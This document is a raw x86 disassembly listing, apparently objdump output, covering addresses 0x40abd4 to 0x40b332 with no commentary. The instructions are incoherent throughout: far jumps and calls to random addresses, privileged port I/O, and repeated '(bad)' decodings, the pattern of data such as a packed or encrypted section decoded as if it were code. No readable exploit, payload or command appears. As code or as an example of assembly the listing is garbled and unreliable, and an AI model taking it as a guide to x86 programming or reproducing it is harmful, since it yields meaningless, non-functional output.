  40abd4:	xor    DWORD PTR [ebx],ebp
  40abd6:	lock inc esi
  40abd8:	push   ebp
  40abd9:	mov    ebp,0xd9b773d8
  40abde:	fst    QWORD PTR [esi]
  40abe0:	push   0xbb8f3c9f
  40abe5:	xchg   esi,eax
  40abe6:	sti    
  40abe7:	xchg   DWORD PTR [ebx+0x6f],esi
  40abea:	rol    DWORD PTR [esp+edx*4],0x0
  40abee:	jmp    0x88d3:0xaaee46a4
  40abf5:	push   0xd37de5ba
  40abfa:	and    ebx,DWORD PTR [edx-0x606dfda5]
  40ac00:	inc    eax
  40ac01:	jbe    0x40abb0
  40ac03:	leave  
  40ac04:	enter  0xfbb5,0x5d
  40ac08:	out    0xfb,al
  40ac0a:	popf   
  40ac0b:	das    
  40ac0c:	rcpps  xmm6,XMMWORD PTR [eax-0x6ab08253]
  40ac13:	outs   dx,BYTE PTR ds:[esi]
  40ac14:	mov    ebx,edx
  40ac16:	loop   0x40abb8
  40ac18:	push   ebx
  40ac19:	push   eax
  40ac1a:	stc    
  40ac1b:	xchg   ebp,eax
  40ac1c:	or     dh,al
  40ac1e:	xchg   edx,eax
  40ac1f:	mov    esi,0xc5be8bf2
  40ac24:	data16 mov al,ds:0x59fddb15
  40ac2a:	icebp  
  40ac2b:	and    eax,0xf33687b7
  40ac30:	leave  
  40ac31:	sbb    ebp,DWORD PTR [ebx]
  40ac33:	mov    esp,esi
  40ac35:	dec    esi
  40ac36:	lds    edi,FWORD PTR [ebx+0x3a24d131]
  40ac3c:	loop   0x40ac6a
  40ac3e:	fwait
  40ac3f:	cli    
  40ac40:	enter  0x2a9a,0x99
  40ac44:	xor    eax,0x5636b312
  40ac49:	sbb    eax,0x5593230f
  40ac4e:	sbb    DWORD PTR cs:[ecx],esp
  40ac51:	pop    eax
  40ac52:	xor    DWORD PTR [ebp+0x4ebc01ad],0x6a
  40ac59:	and    al,BYTE PTR [edx]
  40ac5b:	mov    eax,ds:0x1841ae8
  40ac60:	outs   dx,DWORD PTR ds:[esi]
  40ac61:	add    esi,DWORD PTR [esi]
  40ac63:	fadd   st(2),st
  40ac65:	aaa    
  40ac66:	imul   ebx,DWORD PTR [ebx+eax*1+0x8173c86],0xffffffa9
  40ac6e:	add    BYTE PTR [esi+0x5129fd72],0xda
  40ac75:	cmp    esi,DWORD PTR ds:0xdbd3be7a
  40ac7b:	mov    ebx,0xa500009a
  40ac80:	push   eax
  40ac81:	fld    DWORD PTR ds:0x130ece76
  40ac87:	inc    edi
  40ac88:	dec    esi
  40ac89:	and    eax,0x60fe8151
  40ac8e:	call   0x7762e0aa
  40ac93:	inc    ecx
  40ac94:	inc    ebp
  40ac95:	push   esp
  40ac96:	outs   dx,BYTE PTR ds:[esi]
  40ac97:	push   DWORD PTR [edi+ecx*2]
  40ac9a:	or     DWORD PTR [ecx-0x1d],edi
  40ac9d:	sbb    edx,DWORD PTR [ecx]
  40ac9f:	aam    0xe6
  40aca1:	(bad)  
  40aca2:	sahf   
  40aca3:	ds jle 0x40ace9
  40aca6:	rol    esp,0xb6
  40aca9:	into   
  40acaa:	pusha  
  40acab:	idiv   DWORD PTR [esi-0x46]
  40acae:	jmp    0x7e24:0xb0f02bc9
  40acb5:	les    eax,FWORD PTR [esi+0xda20345]
  40acbb:	dec    ebp
  40acbc:	call   0x38ddff3d
  40acc1:	sahf   
  40acc2:	jae    0x40ad1f
  40acc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acc5:	inc    esi
  40acc6:	scas   eax,DWORD PTR es:[edi]
  40acc7:	inc    BYTE PTR [edi]
  40acc9:	pop    es
  40acca:	icebp  
  40accb:	mov    ebp,0x6ef548fa
  40acd0:	sub    esp,DWORD PTR [edi-0x7a85be11]
  40acd6:	loop   0x40ad13
  40acd8:	or     DWORD PTR [ecx-0x3a0ce4cd],0x8fe3d6ff
  40ace2:	iret   
  40ace3:	add    bl,ch
  40ace5:	std    
  40ace6:	mov    bl,0x63
  40ace8:	(bad)  
  40ace9:	jo     0x40ad32
  40aceb:	retf   0xd6d7
  40acee:	sbb    eax,0x418fa5e0
  40acf3:	inc    eax
  40acf4:	cmp    cl,BYTE PTR [edi-0x68]
  40acf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acf8:	cmc    
  40acf9:	mov    ebx,0x92684cab
  40acfe:	shl    DWORD PTR ds:0x8958890b,cl
  40ad04:	xchg   edi,eax
  40ad05:	mov    bl,0xe7
  40ad07:	add    esi,DWORD PTR [ebx-0x49]
  40ad0a:	and    ebx,esi
  40ad0c:	and    DWORD PTR [ebx],esp
  40ad0e:	add    ebp,ecx
  40ad10:	sub    al,0x6b
  40ad12:	or     DWORD PTR ds:0x6bbe6874,esp
  40ad18:	xor    eax,0xffffff94
  40ad1b:	jbe    0x40ad22
  40ad1d:	mov    esp,0xcf7e27fc
  40ad22:	cmc    
  40ad23:	push   esi
  40ad24:	xchg   esp,eax
  40ad25:	lods   eax,DWORD PTR ds:[esi]
  40ad26:	mov    ds:0x91126a93,eax
  40ad2b:	stos   DWORD PTR es:[edi],eax
  40ad2c:	pop    ebp
  40ad2d:	sbb    al,0xa0
  40ad2f:	cmp    edx,DWORD PTR [ecx-0x2c]
  40ad32:	pop    ebx
  40ad33:	out    dx,eax
  40ad34:	jns    0x40ad29
  40ad36:	or     al,0x84
  40ad38:	call   0x739cffba
  40ad3d:	and    al,0x84
  40ad3f:	jge    0x40adbf
  40ad41:	pusha  
  40ad42:	mov    ds:0xf00338f8,eax
  40ad47:	in     al,dx
  40ad48:	mov    bh,0x84
  40ad4a:	add    DWORD PTR [ecx+0x32],ecx
  40ad4d:	in     al,0x31
  40ad4f:	outs   dx,BYTE PTR ds:[esi]
  40ad50:	xor    ch,dh
  40ad52:	dec    esi
  40ad53:	add    eax,0x46859daa
  40ad58:	mov    WORD PTR [ecx],gs
  40ad5a:	jp     0x40ad07
  40ad5c:	mov    ch,0xad
  40ad5e:	mov    dl,0xb
  40ad60:	dec    esp
  40ad61:	push   ds
  40ad62:	push   eax
  40ad63:	div    esi
  40ad65:	int3   
  40ad66:	xchg   DWORD PTR ds:0x22cd92d9,eax
  40ad6c:	mov    bh,0x98
  40ad6e:	push   ds
  40ad6f:	aaa    
  40ad70:	dec    edx
  40ad71:	mov    bh,0x5f
  40ad73:	out    dx,al
  40ad74:	shr    BYTE PTR [esi-0x39],cl
  40ad77:	rcl    dl,0x1b
  40ad7a:	shl    BYTE PTR [edx+0x42],0xfe
  40ad7e:	jle    0x40add6
  40ad80:	dec    eax
  40ad81:	dec    edi
  40ad82:	imul   ebp,DWORD PTR [eax+0x35b84c44],0x1e
  40ad89:	jg     0x40ade8
  40ad8b:	loopne 0x40ad82
  40ad8d:	into   
  40ad8e:	cmp    esp,esi
  40ad90:	xchg   esp,eax
  40ad91:	shr    DWORD PTR [eax+0x75c44daf],0x84
  40ad98:	int3   
  40ad99:	add    DWORD PTR [ecx],edx
  40ad9b:	retf   0x81ad
  40ad9e:	(bad)  
  40ad9f:	and    BYTE PTR [ecx+0x20f71c8e],bl
  40ada5:	rcl    BYTE PTR [ebp+0x16],1
  40ada8:	add    esi,ebp
  40adaa:	test   cl,al
  40adac:	or     al,0x67
  40adae:	cmp    esi,DWORD PTR [edx-0x7a73bc3e]
  40adb4:	push   0xd
  40adb6:	mov    edi,0x2a4aba92
  40adbb:	loop   0x40ad95
  40adbd:	cmp    esi,DWORD PTR [ecx]
  40adbf:	add    ebx,ebx
  40adc1:	adc    bl,bl
  40adc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adc4:	sbb    ah,BYTE PTR [esp+ebp*1]
  40adc7:	stos   BYTE PTR es:[edi],al
  40adc8:	mov    al,BYTE PTR [edx-0x35]
  40adcb:	in     eax,dx
  40adcc:	(bad)  
  40adcd:	xor    al,0x97
  40adcf:	jl     0x40ad6b
  40add1:	in     al,0xc9
  40add3:	fs dec esi
  40add5:	adc    bl,bh
  40add7:	pop    ebx
  40add8:	or     esi,eax
  40adda:	inc    esp
  40addb:	ficom  WORD PTR es:[eax+0x3e49f7a0]
  40ade2:	retf   0x4bd9
  40ade5:	lahf   
  40ade6:	imul   edx,eax,0x16c0b827
  40adec:	rol    BYTE PTR [edi+0x6c1066f4],cl
  40adf2:	mov    dh,BYTE PTR [esi-0x221f92c6]
  40adf8:	pop    ss
  40adf9:	mov    bl,0xb7
  40adfb:	loope  0x40adc6
  40adfd:	(bad)  
  40adfe:	icebp  
  40adff:	xchg   DWORD PTR [esi+0xb],eax
  40ae02:	dec    esi
  40ae03:	xchg   ebx,eax
  40ae04:	sahf   
  40ae05:	inc    esp
  40ae06:	mov    ds:0xe2e90463,eax
  40ae0b:	push   edi
  40ae0c:	les    edx,FWORD PTR ds:0x2db582d
  40ae12:	fucomi st,st(0)
  40ae14:	mov    edi,0x57aec329
  40ae19:	xchg   esp,eax
  40ae1a:	jno    0x40adfd
  40ae1c:	lods   eax,DWORD PTR ds:[esi]
  40ae1d:	push   edx
  40ae1e:	or     cl,BYTE PTR [ebx-0x74306753]
  40ae24:	fidiv  WORD PTR [esi]
  40ae26:	test   DWORD PTR ds:0x75276de0,0x78ebff9
  40ae30:	nop
  40ae31:	adc    esp,ebx
  40ae33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae34:	test   eax,0x9f0341d2
  40ae39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae3a:	fnstsw WORD PTR [edi-0x3df3d2e4]
  40ae40:	popa   
  40ae41:	sub    cl,0x71
  40ae44:	cmp    BYTE PTR [eax-0x40],ch
  40ae47:	inc    edi
  40ae48:	sub    ecx,edi
  40ae4a:	push   ds
  40ae4b:	lahf   
  40ae4c:	icebp  
  40ae4d:	sub    eax,0xda9db991
  40ae52:	mov    BYTE PTR [edx*8+0x53c24d93],ah
  40ae59:	push   cs
  40ae5a:	pushf  
  40ae5b:	sbb    DWORD PTR [ecx+eax*8],edi
  40ae5e:	mov    al,0x67
  40ae60:	cmp    esi,edx
  40ae62:	lods   eax,DWORD PTR ds:[esi]
  40ae63:	jle    0x40ae76
  40ae65:	fsubr  st(4),st
  40ae67:	add    al,ah
  40ae69:	jno    0x40ae81
  40ae6b:	lds    edx,FWORD PTR [ecx+0x29]
  40ae6e:	shl    DWORD PTR [edi-0x78],1
  40ae71:	pop    ecx
  40ae72:	ja     0x40aec1
  40ae74:	xchg   esi,eax
  40ae75:	sahf   
  40ae76:	scas   eax,DWORD PTR es:[edi]
  40ae77:	sub    bh,BYTE PTR [eax+eiz*2-0x1ac17dd7]
  40ae7e:	cmp    edi,DWORD PTR [ebx+0x49]
  40ae81:	in     al,0xb7
  40ae83:	scas   eax,DWORD PTR es:[edi]
  40ae84:	in     al,0x68
  40ae86:	das    
  40ae87:	sub    esp,0x7730b7d6
  40ae8d:	cmp    al,0x55
  40ae8f:	adc    ch,BYTE PTR [ecx-0x3d]
  40ae92:	in     al,0x0
  40ae94:	retf   0x231a
  40ae97:	nop
  40ae98:	adc    edx,esp
  40ae9a:	xchg   esi,eax
  40ae9b:	push   esi
  40ae9c:	retf   0x9bd4
  40ae9f:	jb     0x40ae91
  40aea1:	ins    BYTE PTR es:[edi],dx
  40aea2:	mov    bl,0xc
  40aea4:	mov    eax,ds:0x7d38d0db
  40aea9:	ror    BYTE PTR [edx],1
  40aeab:	test   cl,bh
  40aead:	int3   
  40aeae:	or     ecx,DWORD PTR [eax-0x60]
  40aeb1:	add    edx,DWORD PTR [esp+ecx*4-0x234adf00]
  40aeb8:	(bad)  
  40aeb9:	mov    cl,0x4f
  40aebb:	mov    eax,ds:0x96873a18
  40aec0:	aam    0x54
  40aec2:	fcom   QWORD PTR [edx-0x2298232b]
  40aec8:	sbb    eax,0xbfd12a1b
  40aecd:	push   ds
  40aece:	cmp    BYTE PTR [esi-0x6183cfe0],al
  40aed4:	xchg   ecx,eax
  40aed5:	inc    ecx
  40aed6:	push   es
  40aed7:	retf   0x615f
  40aeda:	mov    cs,WORD PTR [ebx]
  40aedc:	add    al,0x68
  40aede:	stos   BYTE PTR es:[edi],al
  40aedf:	mov    bh,0xe3
  40aee1:	pop    esp
  40aee2:	loope  0x40ae98
  40aee4:	ror    DWORD PTR [edi],0xff
  40aee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aee8:	fdivr  QWORD PTR [eax-0x38]
  40aeeb:	fiadd  WORD PTR [ebx]
  40aeed:	aas    
  40aeee:	loope  0x40af2a
  40aef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef1:	fist   WORD PTR [esi-0x4d]
  40aef4:	stc    
  40aef5:	mov    al,ds:0x1eac6316
  40aefa:	mov    bh,0x7d
  40aefc:	sub    eax,0x6966b675
  40af01:	push   ebp
  40af02:	inc    ecx
  40af03:	sbb    dl,bh
  40af05:	rcl    DWORD PTR [ecx],0x74
  40af08:	outs   dx,BYTE PTR ds:[esi]
  40af09:	es cld 
  40af0b:	in     eax,dx
  40af0c:	inc    ebp
  40af0d:	inc    esp
  40af0e:	add    edx,DWORD PTR [ecx+0x77]
  40af11:	sub    BYTE PTR ds:0x1acdb51d,al
  40af17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af18:	add    DWORD PTR ds:0xa91c4f0,0x8ed4d7c4
  40af22:	scas   eax,DWORD PTR es:[edi]
  40af23:	push   0xeb0a3cee
  40af28:	pop    edi
  40af29:	adc    eax,0x4f25391b
  40af2e:	or     ah,ch
  40af30:	pusha  
  40af31:	mov    ds:0xdc1e2ed7,eax
  40af36:	in     eax,0x64
  40af38:	dec    edi
  40af39:	dec    DWORD PTR [edx+0x34]
  40af3c:	sti    
  40af3d:	sahf   
  40af3e:	mov    bl,0x3e
  40af40:	or     eax,DWORD PTR [eax]
  40af42:	scas   al,BYTE PTR es:[edi]
  40af43:	test   al,0xbe
  40af45:	(bad)
  40af48:	cwde   
  40af49:	bound  esi,QWORD PTR [esi+ebx*8-0x4]
  40af4d:	test   DWORD PTR [ebp+esi*2-0x28],ebx
  40af51:	rdpmc  
  40af53:	sahf   
  40af54:	nop
  40af55:	out    0x60,eax
  40af57:	int    0x72
  40af59:	pop    ebp
  40af5a:	fstp   QWORD PTR [edx]
  40af5c:	cs popa 
  40af5e:	je     0x40af2e
  40af60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af61:	iret   
  40af62:	mov    ah,0x1c
  40af64:	sub    esp,esi
  40af66:	inc    ecx
  40af67:	pop    ecx
  40af68:	scas   eax,DWORD PTR es:[edi]
  40af69:	xchg   edi,eax
  40af6a:	lods   al,BYTE PTR ds:[esi]
  40af6b:	loopne 0x40afd9
  40af6d:	(bad)  
  40af6e:	jb     0x40af2f
  40af70:	inc    ecx
  40af71:	sbb    dl,BYTE PTR [ebx-0x41d7cc02]
  40af77:	sar    BYTE PTR [ebp-0x2abfb571],1
  40af7d:	pop    ss
  40af7e:	cmc    
  40af7f:	scas   eax,DWORD PTR es:[edi]
  40af80:	(bad)  
  40af81:	popa   
  40af82:	xor    eax,0x26a9d914
  40af87:	sbb    al,0xb6
  40af89:	inc    ebx
  40af8a:	nop
  40af8b:	dec    ebp
  40af8c:	mov    ds:0x26f0b2fa,al
  40af91:	jbe    0x40af90
  40af93:	loope  0x40af24
  40af95:	(bad)  
  40af96:	lock mov cl,0x3f
  40af9a:	test   eax,0x27fe2950
  40af9f:	inc    ecx
  40afa0:	sub    ebp,DWORD PTR [ebx-0x62]
  40afa3:	or     DWORD PTR [ecx+ecx*8+0x29981125],esp
  40afaa:	pop    ebp
  40afab:	push   edi
  40afac:	and    dh,BYTE PTR [edx+edx*4]
  40afaf:	setae  BYTE PTR [eax]
  40afb2:	inc    edx
  40afb3:	xchg   esi,eax
  40afb4:	mov    fs,edi
  40afb6:	dec    esp
  40afb7:	sub    ebp,DWORD PTR [edx-0x51]
  40afba:	xchg   ecx,eax
  40afbb:	xchg   edi,eax
  40afbc:	push   edi
  40afbd:	jmp    0x683264a1
  40afc2:	shl    BYTE PTR [ecx-0x24],0x54
  40afc6:	push   edx
  40afc7:	sbb    BYTE PTR [esi-0x1636c97f],bh
  40afcd:	and    al,0x6b
  40afcf:	cdq    
  40afd0:	jmp    0xf6f:0x398d1c28
  40afd7:	mov    bh,0x40
  40afd9:	sar    dh,1
  40afdb:	dec    esp
  40afdc:	inc    ebx
  40afdd:	sbb    al,0xb8
  40afdf:	and    al,0xea
  40afe1:	mov    ah,0x9f
  40afe3:	push   0x49579f49
  40afe8:	stc    
  40afe9:	hlt    
  40afea:	into   
  40afeb:	add    al,0x82
  40afed:	enter  0x4c49,0x5c
  40aff1:	cmp    BYTE PTR [eax+0x7c],0x4e
  40aff5:	outs   dx,BYTE PTR ds:[esi]
  40aff6:	or     eax,0x2cb12408
  40affb:	sub    eax,0xcb0114e1
  40b000:	test   DWORD PTR [esi],0xc8ece43
  40b006:	sub    ah,dl
  40b008:	int3   
  40b009:	ja     0x40afd8
  40b00b:	and    bl,BYTE PTR [eax-0x5918c7d1]
  40b011:	dec    edx
  40b012:	jp     0x40b079
  40b014:	or     DWORD PTR [eax],0x4c
  40b017:	pop    esi
  40b018:	adc    al,0x97
  40b01a:	jnp    0x40b04c
  40b01c:	clc    
  40b01d:	dec    esi
  40b01e:	xchg   edi,eax
  40b01f:	div    ebx
  40b021:	cld    
  40b022:	mov    al,ds:0xf0c6f431
  40b027:	jecxz  0x40b05a
  40b029:	add    al,0xd
  40b02b:	shr    DWORD PTR [esi],1
  40b02d:	jmp    0xd9e1:0xeda5fa38
  40b034:	inc    eax
  40b035:	rcr    DWORD PTR [edx-0x436a3fbe],1
  40b03b:	xor    eax,0x8306c71e
  40b040:	daa    
  40b041:	pop    ecx
  40b042:	cwde   
  40b043:	adc    eax,0x51ec8b0f
  40b048:	psubsw mm5,QWORD PTR [eax-0x12f8303b]
  40b04f:	mov    bh,0x5f
  40b051:	lahf   
  40b052:	cli    
  40b053:	cdq    
  40b054:	js     0x40afe6
  40b056:	push   eax
  40b057:	add    BYTE PTR [ebx*2+0x6d1b6cf],ah
  40b05e:	lock retf 0x6cc2
  40b062:	inc    edi
  40b063:	pop    ebp
  40b064:	sbb    eax,0xd525e500
  40b069:	pop    esi
  40b06a:	call   0x9759ed8d
  40b06f:	mov    ebp,0x855505d0
  40b074:	and    ebx,DWORD PTR [edi-0x5aed7bc7]
  40b07a:	and    al,0xe5
  40b07c:	xlat   BYTE PTR ds:[ebx]
  40b07d:	(bad)  
  40b07e:	ins    BYTE PTR es:[edi],dx
  40b07f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b080:	jg     0x40b012
  40b082:	fisubr WORD PTR [eax+ebx*8]
  40b085:	je     0x40b022
  40b087:	sbb    DWORD PTR [ecx+0x1e],0x4e344022
  40b08e:	gs mov ebx,0xfeaf24d1
  40b094:	jno    0x40b03d
  40b096:	retf   
  40b097:	mov    bh,BYTE PTR [edi-0x1b]
  40b09a:	xor    ah,BYTE PTR [eax+0x193bf1d7]
  40b0a0:	pop    eax
  40b0a1:	push   esp
  40b0a2:	imul   esp,DWORD PTR [edx],0xffffffc7
  40b0a5:	sub    esi,edi
  40b0a7:	cmc    
  40b0a8:	das    
  40b0a9:	loop   0x40b037
  40b0ab:	inc    edx
  40b0ac:	daa    
  40b0ad:	push   eax
  40b0ae:	sar    BYTE PTR [eax-0x67],1
  40b0b1:	dec    ebp
  40b0b2:	xchg   ecx,eax
  40b0b3:	mov    ebp,0x9a7497f6
  40b0b8:	xchg   ecx,eax
  40b0b9:	loop   0x40b0cc
  40b0bb:	pop    ebx
  40b0bc:	jne    0x40b0a9
  40b0be:	je     0x40b0f6
  40b0c0:	xor    ah,BYTE PTR [ecx-0x68]
  40b0c3:	jnp    0x40b069
  40b0c5:	adc    ah,BYTE PTR [ebx]
  40b0c7:	inc    ecx
  40b0c8:	mov    ch,0xaa
  40b0ca:	into   
  40b0cb:	or     bl,BYTE PTR [ebx-0x11]
  40b0ce:	lahf   
  40b0cf:	and    al,BYTE PTR ds:0xd4a29b0b
  40b0d5:	shl    ch,1
  40b0d7:	mov    esp,0xce827436
  40b0dc:	cmp    BYTE PTR [ebp-0x51d00786],ch
  40b0e2:	test   DWORD PTR [esi],esi
  40b0e4:	pop    ds
  40b0e5:	jbe    0x40b0e3
  40b0e7:	out    0x2,al
  40b0e9:	lods   eax,DWORD PTR ds:[esi]
  40b0ea:	lahf   
  40b0eb:	js     0x40b07b
  40b0ed:	mov    ds:0x3239304b,eax
  40b0f2:	clc    
  40b0f3:	ds mov cl,0x31
  40b0f6:	sti    
  40b0f7:	mov    ds:0xa0b29416,al
  40b0fc:	mov    esi,0xe015c5ec
  40b101:	adc    ecx,DWORD PTR [eax]
  40b103:	out    0x4b,eax
  40b105:	xchg   edx,eax
  40b106:	pushf  
  40b107:	cmp    dl,BYTE PTR [eax]
  40b109:	cld    
  40b10a:	jmp    0x26643091
  40b10f:	push   edi
  40b110:	(bad)  
  40b111:	jle    0x40b151
  40b113:	(bad)  
  40b114:	mov    eax,0x26164229
  40b119:	jbe    0x40b164
  40b11b:	pop    esp
  40b11c:	pop    ecx
  40b11d:	ret    0x12b8
  40b120:	cli    
  40b121:	add    BYTE PTR [ebx+ebp*4],ch
  40b124:	test   al,0xe0
  40b126:	in     al,dx
  40b127:	sbb    al,0xca
  40b129:	xlat   BYTE PTR ds:[ebx]
  40b12a:	stos   DWORD PTR es:[edi],eax
  40b12b:	dec    ebx
  40b12c:	and    BYTE PTR [ebp*1-0x66cf8a6],ah
  40b133:	ret    
  40b134:	mov    DWORD PTR [edx-0x33bae0b2],ecx
  40b13a:	and    DWORD PTR [esi+0x10],0xe7bf32b5
  40b141:	int    0x77
  40b143:	retf   0x6459
  40b146:	and    DWORD PTR [edi+0x3f],ebp
  40b149:	dec    esi
  40b14a:	jg     0x40b1b7
  40b14c:	and    ecx,ecx
  40b14e:	sbb    dl,BYTE PTR [ecx+0x3a]
  40b151:	inc    ecx
  40b152:	fnstenv [ebx+ecx*1-0xff53028]
  40b159:	popf   
  40b15a:	ror    ecx,0x28
  40b15d:	jle    0x40b1d6
  40b15f:	retf   
  40b160:	pop    ebx
  40b161:	mov    al,ds:0x1a1a6166
  40b166:	jo     0x40b16f
  40b168:	pop    edx
  40b169:	mov    bl,0x1b
  40b16b:	fistp  QWORD PTR [ebx]
  40b16d:	inc    edx
  40b16e:	inc    ebp
  40b16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b170:	data16 jo 0x40b109
  40b173:	out    dx,al
  40b174:	mov    ebp,0xed5e5070
  40b179:	stos   DWORD PTR es:[edi],eax
  40b17a:	jg     0x40b1c3
  40b17c:	xor    dl,ah
  40b17e:	test   al,0xcd
  40b180:	movhps QWORD PTR [ebp-0x3c],xmm0
  40b184:	pop    edx
  40b185:	sbb    al,0x5c
  40b187:	push   edx
  40b188:	mov    esp,0x9e3fd8ae
  40b18d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b18e:	cmp    ecx,DWORD PTR [edi]
  40b190:	gs mov ch,0x37
  40b193:	das    
  40b194:	lods   al,BYTE PTR ds:[esi]
  40b195:	pop    edx
  40b196:	cmp    al,0xfa
  40b198:	sbb    al,0x78
  40b19a:	fadd   DWORD PTR [edx+0x5f]
  40b19d:	or     BYTE PTR [edi-0x30],dh
  40b1a0:	or     ebx,edx
  40b1a2:	add    al,0xd7
  40b1a4:	inc    ebp
  40b1a5:	sbb    al,0x1a
  40b1a7:	cmc    
  40b1a8:	mov    eax,DWORD PTR [edi+0x58]
  40b1ab:	xchg   ebx,eax
  40b1ac:	hlt    
  40b1ad:	sti    
  40b1ae:	aaa    
  40b1af:	stos   BYTE PTR es:[edi],al
  40b1b0:	fucomi st,st(1)
  40b1b2:	jmp    DWORD PTR [ebp+0x213b30f7]
  40b1b8:	mov    BYTE PTR [esi-0x7cb33aaf],bh
  40b1be:	fld    QWORD PTR [edi+eiz*1-0x16]
  40b1c2:	jmp    0x40b1e1
  40b1c4:	mov    al,0x23
  40b1c6:	mov    ebx,0x8cdeacf
  40b1cc:	test   BYTE PTR [ebx+0x65ced775],al
  40b1d2:	sub    ch,bh
  40b1d4:	sub    BYTE PTR [ecx+0x11d1e518],dl
  40b1da:	adc    BYTE PTR [ecx+esi*2+0x7d],dh
  40b1de:	popf   
  40b1df:	inc    ecx
  40b1e0:	clc    
  40b1e1:	in     eax,0x79
  40b1e3:	cld    
  40b1e4:	pusha  
  40b1e5:	(bad)  
  40b1e6:	jmp    0x62cb:0xab448ee7
  40b1ed:	mov    ds:0x4f5fd017,al
  40b1f2:	arpl   cx,si
  40b1f4:	repz xchg esi,eax
  40b1f6:	xchg   esi,eax
  40b1f7:	arpl   dx,ax
  40b1f9:	and    DWORD PTR [eax+0x3],0x9a7b13fe
  40b200:	into   
  40b201:	xor    eax,0x6cf57ff2
  40b206:	add    cl,BYTE PTR [ecx-0x19cc733d]
  40b20c:	sbb    eax,0x1707a85b
  40b211:	mov    edi,0x3a71f1ed
  40b216:	addr16 mov ah,0xac
  40b219:	mov    edi,0xa798b16b
  40b21e:	pop    ebx
  40b21f:	fcom   st(5)
  40b221:	adc    BYTE PTR [ecx-0x7a],dh
  40b224:	sbb    DWORD PTR [esp+esi*1-0xef79e6a],ebx
  40b22b:	sbb    al,0xab
  40b22d:	stc    
  40b22e:	xchg   ecx,eax
  40b22f:	pop    ebp
  40b230:	fistp  QWORD PTR [esi-0x2b]
  40b233:	leave  
  40b234:	jmp    0x40b238
  40b236:	cmp    eax,0x3a5b0143
  40b23b:	pop    ebx
  40b23c:	cmp    DWORD PTR [ecx-0x43],eax
  40b23f:	sbb    al,0xff
  40b241:	push   ebx
  40b242:	call   0x2f4e:0xbc763539
  40b249:	scas   al,BYTE PTR es:[edi]
  40b24a:	pop    edi
  40b24b:	outs   dx,DWORD PTR ds:[esi]
  40b24c:	push   esi
  40b24d:	add    esp,DWORD PTR [ecx-0x3fec70d0]
  40b253:	mov    ds:0xf8afb964,al
  40b258:	jmp    0x40b290
  40b25a:	lods   eax,DWORD PTR ds:[esi]
  40b25b:	stos   BYTE PTR es:[edi],al
  40b25c:	js     0x40b20b
  40b25e:	sbb    al,0xc1
  40b260:	or     dl,BYTE PTR [ecx+ebx*8]
  40b263:	in     eax,0xb1
  40b265:	mov    eax,0x8450c300
  40b26a:	in     al,dx
  40b26b:	ins    BYTE PTR es:[edi],dx
  40b26c:	add    ebx,DWORD PTR [edi]
  40b26e:	mov    al,0xaa
  40b270:	jmp    0x81ccb7ce
  40b275:	mov    ebp,0x92177f01
  40b27a:	jae    0x40b2d5
  40b27c:	or     DWORD PTR [edx+0x1e],0x166d993b
  40b283:	sbb    DWORD PTR [edx+esi*1],ebp
  40b286:	adc    al,0xd
  40b288:	cmp    al,BYTE PTR [ecx]
  40b28a:	jge    0x40b257
  40b28c:	pop    edi
  40b28d:	sbb    dh,BYTE PTR [edi-0x3b]
  40b290:	ficomp DWORD PTR [edx]
  40b292:	in     al,dx
  40b293:	shl    DWORD PTR [ebx],1
  40b295:	and    DWORD PTR [esi+0xe],0xffffff8a
  40b299:	pusha  
  40b29a:	pop    ss
  40b29b:	mov    esp,0xf73781c9
  40b2a0:	repz lds ebx,FWORD PTR ds:0xda0e08bb
  40b2a7:	fs popa 
  40b2a9:	dec    edi
  40b2aa:	cli    
  40b2ab:	xor    esi,esp
  40b2ad:	add    ch,dh
  40b2af:	cli    
  40b2b0:	or     DWORD PTR [esi-0x3e],esi
  40b2b3:	mov    WORD PTR [edx-0x7],?
  40b2b6:	stos   DWORD PTR es:[edi],eax
  40b2b7:	cmc    
  40b2b8:	xchg   esp,eax
  40b2b9:	js     0x40b273
  40b2bb:	sar    DWORD PTR [edx],cl
  40b2bd:	xchg   edx,eax
  40b2be:	call   0x4273ae42
  40b2c3:	test   eax,0x2e1069ce
  40b2c8:	jo     0x40b2fc
  40b2ca:	inc    BYTE PTR [esi+0x1c2e62e4]
  40b2d0:	ficom  WORD PTR [ebx+0x43]
  40b2d3:	push   0xb
  40b2d5:	adc    al,0xd0
  40b2d7:	mov    dh,0x43
  40b2d9:	adc    DWORD PTR [esi+ebp*1-0x5dcbd728],0x91ef4f28
  40b2e4:	dec    edx
  40b2e5:	xor    BYTE PTR [edi-0x41],ah
  40b2e8:	int    0x22
  40b2ea:	leave  
  40b2eb:	mov    ds:0x7781b3ca,al
  40b2f0:	add    eax,0x7d124fd5
  40b2f5:	in     eax,dx
  40b2f6:	cmp    ch,al
  40b2f8:	and    eax,0x88cd717b
  40b2fd:	rcl    ebx,1
  40b2ff:	cli    
  40b300:	jnp    0x40b352
  40b302:	shl    ebp,cl
  40b304:	dec    ecx
  40b305:	xchg   BYTE PTR [ebx-0x347003c7],cl
  40b30b:	dec    edx
  40b30c:	inc    ecx
  40b30d:	(bad)  
  40b30e:	in     al,dx
  40b30f:	mov    dh,0x96
  40b311:	jecxz  0x40b2f3
  40b313:	ins    BYTE PTR es:[edi],dx
  40b314:	out    dx,al
  40b315:	adc    al,0x5a
  40b317:	add    ch,BYTE PTR [edi+0x5dbdaf08]
  40b31d:	sub    ch,BYTE PTR [edx+0x52]
  40b320:	cmp    dh,dh
  40b322:	aam    0xdf
  40b324:	inc    esp
  40b325:	add    ch,dh
  40b327:	dec    esp
  40b328:	outs   dx,BYTE PTR ds:[esi]
  40b329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b32a:	xchg   esi,eax
  40b32b:	adc    al,0xbc
  40b32d:	mov    bl,bl
  40b32f:	xor    esi,DWORD PTR [ecx+0x79]
  40b332:	mov    al,ds:0x312c9e7c
